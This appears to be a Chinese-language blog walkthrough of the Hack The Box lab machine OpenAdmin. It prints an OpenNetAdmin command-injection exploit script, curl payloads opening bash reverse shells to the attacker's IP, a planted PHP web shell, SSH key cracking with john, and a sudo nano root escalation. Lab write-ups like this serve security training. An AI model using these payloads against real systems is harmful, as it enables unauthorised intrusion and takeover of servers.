10.10.10.171<br>Host is up (0.096s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 4b98df85d17ef03dda48cdbc9200b754 (RSA)<br>|   256 dceb3dc944d118b122b4cfdebd6c7a54 (ECDSA)<br>|_  256 dcadca3c11315b6fe6a489347c9be550 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))<br>|_http-server-header: Apache/2.4.29 (Ubuntu)<br>|_http-title: Apache2 Ubuntu Default Page: It works<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://ParrotOS.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 10.83 seconds<br>zsh: segmentation fault  sudo nmap -sC -sV 10.10.10.171 -oN OpenAdmin -p22,80<br><br>Crazy:~/HackThebox/OpenAdmin$ curl -I 10.10.10.171  <br>HTTP/1.1 200 OK<br>Date: Mon, 22 Aug 2022 06:04:16 GMT<br>Server: Apache/2.4.29 (Ubuntu)<br>Last-Modified: Thu, 21 Nov 2019 14:08:45 GMT<br>ETag: <span class="hljs-string">&quot;2aa6-597dbd5dcea8b&quot;</span><br>Accept-Ranges: bytes<br>Content-Length: 10918<br>Vary: Accept-Encoding<br>Content-Type: text/html<br></code></pre></td></tr></table></figure><p>80端口是Apache默认页面。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ dirsearch -u http://10.10.10.171/<br><br>  _|. _ _  _  _  _ _|_    v0.4.2<br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /home/crazyinside/.dirsearch/reports/10.10.10.171/-_22-08-22_14-04-03.txt<br><br>Error Log: /home/crazyinside/.dirsearch/logs/errors-22-08-22_14-04-03.<span class="hljs-built_in">log</span><br><br>Target: http://10.10.10.171/<br><br>[14:04:03] Starting: <br>[14:04:11] 403 -  277B  - /.ht_wsr.txt<br>[14:04:11] 403 -  277B  - /.htaccess.save<br>[14:04:11] 403 -  277B  - /.htaccess.sample<br>[14:04:11] 403 -  277B  - /.htaccess.bak1<br>[14:04:11] 403 -  277B  - /.htaccess_extra<br>[14:04:11] 403 -  277B  - /.htaccessOLD<br>[14:04:11] 403 -  277B  - /.htaccess.orig<br>[14:04:11] 403 -  277B  - /.htaccess_orig<br>[14:04:11] 403 -  277B  - /.htaccess_sc<br>[14:04:11] 403 -  277B  - /.htaccessBAK<br>[14:04:11] 403 -  277B  - /.htaccessOLD2<br>[14:04:11] 403 -  277B  - /.htm<br>[14:04:11] 403 -  277B  - /.httr-oauth<br>[14:04:11] 403 -  277B  - /.html<br>[14:04:11] 403 -  277B  - /.htpasswd_test<br>[14:04:11] 403 -  277B  - /.htpasswds<br>[14:04:13] 403 -  277B  - /.php<br>[14:04:59] 200 -   11KB - /index.html<br>[14:05:07] 301 -  312B  - /music  -&gt;  http://10.10.10.171/music/<br>[14:05:09] 301 -  310B  - /ona  -&gt;  http://10.10.10.171/ona/<br>[14:05:18] 403 -  277B  - /server-status<br>[14:05:18] 403 -  277B  - /server-status/<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822140815676.png" alt="image-20220822140815676"></p><p>都是一些静态页面，顺着登录可以跳转到<img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822141232496.png" alt="image-20220822141232496"></p><p>并且顺着帮助索引能够跳转到Github，Github有说默认口令是admin:admin。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/OpenAdmin$ searchsploit opennetadmin           <br>----------------------------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                                       |  Path<br>----------------------------------------------------------------------------------------------------- ---------------------------------<br>OpenNetAdmin 13.03.01 - Remote Code Execution                                                        | php/webapps/26682.txt<br>OpenNetAdmin 18.1.1 - Command Injection Exploit (Metasploit)                                         | php/webapps/47772.rb<br>OpenNetAdmin 18.1.1 - Remote Code Execution                                                          | php/webapps/47691.sh<br>----------------------------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br>Papers: No Results<br>                                <br></code></pre></td></tr></table></figure><p>msf的好像没什么用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; show options <br><br>Module options (exploit/unix/webapp/opennetadmin_ping_cmd_injection):<br><br>   Name       Current Setting  Required  Description<br>   ----       ---------------  --------  -----------<br>   Proxies                     no        A proxy chain of format <span class="hljs-built_in">type</span>:host:port[,<span class="hljs-built_in">type</span>:host:port][...]<br>   RHOSTS                      <span class="hljs-built_in">yes</span>       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit<br>   RPORT      80               <span class="hljs-built_in">yes</span>       The target port (TCP)<br>   SSL        <span class="hljs-literal">false</span>            no        Negotiate SSL/TLS <span class="hljs-keyword">for</span> outgoing connections<br>   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)<br>   TARGETURI  /ona/login.php   <span class="hljs-built_in">yes</span>       Base path<br>   URIPATH                     no        The URI to use <span class="hljs-keyword">for</span> this exploit (default is random)<br>   VHOST                       no        HTTP server virtual host<br><br><br>Payload options (linux/x86/meterpreter/reverse_tcp):<br><br>   Name   Current Setting  Required  Description<br>   ----   ---------------  --------  -----------<br>   LHOST                   <span class="hljs-built_in">yes</span>       The listen address (an interface may be specified)<br>   LPORT  4444             <span class="hljs-built_in">yes</span>       The listen port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Automatic Target<br><br><br>msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; <span class="hljs-built_in">set</span> RHOSTS 10.10.10.171<br>RHOSTS =&gt; 10.10.10.171<br>msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; <span class="hljs-built_in">set</span> LHOST 10.10.16.3<br>LHOST =&gt; 10.10.16.3<br>msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; run<br><br>[*] Started reverse TCP handler on 10.10.16.3:4444 <br>[*] Exploiting...<br>[*] Command Stager progress - 100.00% <span class="hljs-keyword">done</span> (702/702 bytes)<br>[*] Exploit completed, but no session was created.<br>msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; exploit <br><br>[*] Started reverse TCP handler on 10.10.16.3:4444 <br>[*] Exploiting...<br>[*] Command Stager progress - 100.00% <span class="hljs-keyword">done</span> (702/702 bytes)<br>[*] Exploit completed, but no session was created.<br>msf6 exploit(unix/webapp/opennetadmin_ping_cmd_injection) &gt; <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/OpenAdmin$ <span class="hljs-built_in">cat</span> 47691.sh                      <br><span class="hljs-comment"># Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution</span><br><span class="hljs-comment"># Date: 2019-11-19</span><br><span class="hljs-comment"># Exploit Author: mattpascoe</span><br><span class="hljs-comment"># Vendor Homepage: http://opennetadmin.com/</span><br><span class="hljs-comment"># Software Link: https://github.com/opennetadmin/ona</span><br><span class="hljs-comment"># Version: v18.1.1</span><br><span class="hljs-comment"># Tested on: Linux</span><br><br><span class="hljs-comment"># Exploit Title: OpenNetAdmin v18.1.1 RCE</span><br><span class="hljs-comment"># Date: 2019-11-19</span><br><span class="hljs-comment"># Exploit Author: mattpascoe</span><br><span class="hljs-comment"># Vendor Homepage: http://opennetadmin.com/</span><br><span class="hljs-comment"># Software Link: https://github.com/opennetadmin/ona</span><br><span class="hljs-comment"># Version: v18.1.1</span><br><span class="hljs-comment"># Tested on: Linux</span><br><br><span class="hljs-comment">#!/bin/bash</span><br><br>URL=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;1&#125;</span>&quot;</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>;<span class="hljs-keyword">do</span><br> <span class="hljs-built_in">echo</span> -n <span class="hljs-string">&quot;$ &quot;</span>; <span class="hljs-built_in">read</span> cmd<br> curl --silent -d <span class="hljs-string">&quot;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&quot;BEGIN\&quot;;<span class="hljs-variable">$&#123;cmd&#125;</span>;echo \&quot;END\&quot;&amp;xajaxargs[]=ping&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;URL&#125;</span>&quot;</span> | sed -n -e <span class="hljs-string">&#x27;/BEGIN/,/END/ p&#x27;</span> | <span class="hljs-built_in">tail</span> -n +2 | <span class="hljs-built_in">head</span> -n -1<br><span class="hljs-keyword">done</span>                                                                                                                                       <br>Crazy:~/HackThebox/OpenAdmin$ <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/OpenAdmin$ curl --silent -d <span class="hljs-string">&quot;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&quot;BEGIN\&quot;;id;echo \&quot;END\&quot;&amp;xajaxargs[]=ping&quot;</span> http://10.10.10.171/ona/<br></code></pre></td></tr></table></figure><p>在页面中会回显执行的结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">            &lt;/tr&gt;<br>            &lt;/table&gt;<br>&lt;!-- Module Output --&gt;<br>&lt;table style=<span class="hljs-string">&quot;background-color: #F2F2F2; padding-left: 25px; padding-right: 25px;&quot;</span> width=<span class="hljs-string">&quot;100%&quot;</span> cellspacing=<span class="hljs-string">&quot;0&quot;</span> border=<span class="hljs-string">&quot;0&quot;</span> cellpadding=<span class="hljs-string">&quot;0&quot;</span>&gt;<br>    &lt;<span class="hljs-built_in">tr</span>&gt;<br>        &lt;td align=<span class="hljs-string">&quot;left&quot;</span> class=<span class="hljs-string">&quot;padding&quot;</span>&gt;<br>            &lt;br&gt;<br>            &lt;div style=<span class="hljs-string">&quot;border: solid 2px #000000; background-color: #FFFFFF; width: 650px; height: 350px; overflow: auto;resize: both;&quot;</span>&gt;<br>                &lt;pre style=<span class="hljs-string">&quot;padding: 4px;font-family: monospace;&quot;</span>&gt;BEGIN<br>                <br>                <br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br><br><br>END<br>&lt;/pre&gt;<br>            &lt;/div&gt;<br>        &lt;/td&gt;<br>    &lt;/tr&gt;<br>&lt;/table&gt;<br><br>&lt;!-- Just a little padding --&gt;<br>&lt;table style=<span class="hljs-string">&quot;background-color: #F2F2F2; padding-left: 25px; padding-right: 25px;&quot;</span> width=<span class="hljs-string">&quot;100%&quot;</span> cellspacing=<span class="hljs-string">&quot;0&quot;</span> border=<span class="hljs-string">&quot;0&quot;</span> cellpadding=<span class="hljs-string">&quot;0&quot;</span>&gt;<br>    &lt;<span class="hljs-built_in">tr</span>&gt;<br>        &lt;td <span class="hljs-built_in">id</span>=<span class="hljs-string">&quot;tooltips_extras&quot;</span> align=<span class="hljs-string">&quot;center&quot;</span> class=<span class="hljs-string">&quot;padding&quot;</span>&gt;&lt;input <span class="hljs-built_in">type</span>=<span class="hljs-string">&quot;button&quot;</span> class=<span class="hljs-string">&quot;edit&quot;</span> name=<span class="hljs-string">&quot;Close&quot;</span> value=<span class="hljs-string">&quot;Close&quot;</span> onclick=<span class="hljs-string">&quot;removeElement(&#x27;tooltips_results&#x27;);&quot;</span>&gt;&lt;br&gt;&lt;/td&gt;<br>    &lt;/tr&gt;<br>&lt;/table&gt;<br>        &lt;/td&gt;<br>        &lt;/tr&gt;<br>        &lt;/table&gt;]]&gt;&lt;/cmd&gt;&lt;cmd n=<span class="hljs-string">&quot;js&quot;</span>&gt;&lt;![CDATA[toggle_window(<span class="hljs-string">&#x27;tooltips_results&#x27;</span>);]]&gt;&lt;/cmd&gt;&lt;/xjx&gt;                                                                                                                                       <br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">Crazy:~<span class="hljs-regexp">/HackThebox/</span>OpenAdmin$ curl --silent -d <span class="hljs-string">&quot;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&quot;BEGIN\&quot;;bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.3%2F1337%200%3E%261%27;echo \&quot;END\&quot;&amp;xajaxargs[]=ping&quot;</span> http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.171</span>/ona/<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@openadmin:/var/www/html/ona/local/config$ <span class="hljs-built_in">ls</span><br>database_settings.inc.php  motd.txt.example  run_installer<br>&lt;ml/ona/local/config$ <span class="hljs-built_in">cat</span> database_settings.inc.php      <br>&lt;?php<br><br><span class="hljs-variable">$ona_contexts</span>=array (<br>  <span class="hljs-string">&#x27;DEFAULT&#x27;</span> =&gt; <br>  array (<br>    <span class="hljs-string">&#x27;databases&#x27;</span> =&gt; <br>    array (<br>      0 =&gt; <br>      array (<br>        <span class="hljs-string">&#x27;db_type&#x27;</span> =&gt; <span class="hljs-string">&#x27;mysqli&#x27;</span>,<br>        <span class="hljs-string">&#x27;db_host&#x27;</span> =&gt; <span class="hljs-string">&#x27;localhost&#x27;</span>,<br>        <span class="hljs-string">&#x27;db_login&#x27;</span> =&gt; <span class="hljs-string">&#x27;ona_sys&#x27;</span>,<br>        <span class="hljs-string">&#x27;db_passwd&#x27;</span> =&gt; <span class="hljs-string">&#x27;n1nj4W4rri0R!&#x27;</span>,<br>        <span class="hljs-string">&#x27;db_database&#x27;</span> =&gt; <span class="hljs-string">&#x27;ona_default&#x27;</span>,<br>        <span class="hljs-string">&#x27;db_debug&#x27;</span> =&gt; <span class="hljs-literal">false</span>,<br>      ),<br>    ),<br>    <span class="hljs-string">&#x27;description&#x27;</span> =&gt; <span class="hljs-string">&#x27;Default data context&#x27;</span>,<br>    <span class="hljs-string">&#x27;context_color&#x27;</span> =&gt; <span class="hljs-string">&#x27;#D3DBFF&#x27;</span>,<br>  ),<br>);<br><br>?&gt;www-data@openadmin:/var/www/html/ona/local/config$ <br></code></pre></td></tr></table></figure><p>数据库里没什么信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; <span class="hljs-keyword">select</span> * from <span class="hljs-built_in">users</span>;<br>+----+----------+----------------------------------+-------+---------------------+---------------------+<br>| <span class="hljs-built_in">id</span> | username | password                         | level | ctime               | atime               |<br>+----+----------+----------------------------------+-------+---------------------+---------------------+<br>|  1 | guest    | 098f6bcd4621d373cade4e832627b4f6 |     0 | 2022-08-22 06:31:46 | 2022-08-22 06:31:46 |<br>|  2 | admin    | 21232f297a57a5a743894a0e4a801fc3 |     0 | 2022-08-22 06:16:34 | 2022-08-22 06:16:34 |<br>+----+----------+----------------------------------+-------+---------------------+---------------------+<br></code></pre></td></tr></table></figure><p>密码复用可以登录jimmy：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">jimmy@openadmin:/etc/apache2/sites-enabled$ <span class="hljs-built_in">ls</span><br>internal.conf  openadmin.conf<br>jimmy@openadmin:/etc/apache2/sites-enabled$ <span class="hljs-built_in">cat</span> internal.conf <br>Listen 127.0.0.1:52846<br><br>&lt;VirtualHost 127.0.0.1:52846&gt;<br>    ServerName internal.openadmin.htb<br>    DocumentRoot /var/www/internal<br><br>&lt;IfModule mpm_itk_module&gt;<br>AssignUserID joanna joanna<br>&lt;/IfModule&gt;<br><br>    ErrorLog <span class="hljs-variable">$&#123;APACHE_LOG_DIR&#125;</span>/error.log<br>    CustomLog <span class="hljs-variable">$&#123;APACHE_LOG_DIR&#125;</span>/access.log combined<br><br>&lt;/VirtualHost&gt;<br>jimmy@openadmin:/etc/apache2/sites-enabled$ <br></code></pre></td></tr></table></figure><p>在端口52846似乎还运行着什么服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/OpenAdmin$ ssh jimmy@10.10.10.171 -L 52846:localhost:52846<br>The authenticity of host <span class="hljs-string">&#x27;10.10.10.171 (10.10.10.171)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:wrS/uECrHJqacx68XwnuvI9W+bbKl+rKdSh799gacqo.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.10.171<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">jimmy@10.10.10.171&#x27;</span>s password: <br>Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220822143822870.png" alt="image-20220822143822870"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">jimmy@openadmin:/var/www/internal$ <span class="hljs-built_in">ls</span><br>index.php  logout.php  main.php<br>jimmy@openadmin:/var/www/internal$ <span class="hljs-built_in">echo</span> 1 &gt; 1.txt<br>jimmy@openadmin:/var/www/internal$ <span class="hljs-built_in">ls</span><br>1.txt  index.php  logout.php  main.php<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?php system($_GET[&quot;hack&quot;]); ?&gt;&#x27;</span> &gt; hack.php                  <br>jimmy@openadmin:/var/www/internal$ <br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> &#x27;http://<span class="hljs-number">127.0.0.1:52846</span>/hack.php?hack=bash%<span class="hljs-number">20</span>-c%<span class="hljs-number">20</span>%<span class="hljs-number">27</span>bash%<span class="hljs-number">20</span>-i%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>%<span class="hljs-number">20</span>/dev/tcp/<span class="hljs-number">10.10.16.3</span>/<span class="hljs-number">1338</span>%<span class="hljs-number">200</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">261</span>%<span class="hljs-number">27</span>&#x27;<br></code></pre></td></tr></table></figure><p>随便哪个会话触发一下就行了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox$ nc -lvnp 1338<br>listening on [any] 1338 ...<br>connect to [10.10.16.3] from (UNKNOWN) [10.10.10.171] 49182<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1221): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>joanna@openadmin:/var/www/internal$ <br></code></pre></td></tr></table></figure><p>但是这种shell会受限很多。运行sudo时候会报错。我尝试去用户目录读取了id_rsa，但在使用的过程中需要输入密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/OpenAdmin$ ssh2john id_rsa &gt; <span class="hljs-built_in">hash</span><br>Crazy:~/HackThebox/OpenAdmin$ john -w=/usr/share/wordlists/rockyou.txt <span class="hljs-built_in">hash</span> <br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])<br>Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 2 (iteration count) is 1 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 8 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>bloodninjas      (id_rsa)     <br>1g 0:00:00:02 DONE (2022-08-22 14:54) 0.4566g/s 4371Kp/s 4371Kc/s 4371KC/s bloodofyouth..bloodmabite<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br>                                                                                                                                       <br>Crazy:~/HackThebox/OpenAdmin$ <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">Crazy:~/HackThebox/OpenAdmin$ ssh -i id_rsa joanna@10.10.10.171<br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;id_rsa&#x27;</span>: <br>Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>  System information as of Mon Aug 22 06:50:19 UTC 2022<br><br>  System load:  0.01              Processes:             182<br>  Usage of /:   31.0% of 7.81GB   Users logged <span class="hljs-keyword">in</span>:       1<br>  Memory usage: 14%               IP address <span class="hljs-keyword">for</span> ens160: 10.10.10.171<br>  Swap usage:   0%<br><br><br> * Canonical Livepatch is available <span class="hljs-keyword">for</span> installation.<br>   - Reduce system reboots and improve kernel security. Activate at:<br>     https://ubuntu.com/livepatch<br><br>39 packages can be updated.<br>11 updates are security updates.<br><br>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings<br><br><br>Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15<br>joanna@openadmin:~$ <span class="hljs-built_in">ls</span><br>pwk.py  user.txt<br>joanna@openadmin:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> joanna on openadmin:<br>    env_keep+=<span class="hljs-string">&quot;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET&quot;</span>, env_keep+=<span class="hljs-string">&quot;XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH&quot;</span>,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass<br><br>User joanna may run the following commands on openadmin:<br>    (ALL) NOPASSWD: /bin/nano /opt/priv<br>joanna@openadmin:~$ <br></code></pre></td></tr></table></figure><p>这个提权，用的nano编辑器执行命令的效果，但是直接输入命令会被冻结，需要输入reset; &#x2F;bin&#x2F;sh 1&gt;&amp;0 2&gt;&amp;0，就会出现root标志性#:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><br><br><br>Command to execute: reset; /bin/sh 1&gt;&amp;0 2&gt;&amp;0<span class="hljs-comment"># id                                                                                        </span><br>uid=0(root) gid=0(root) <span 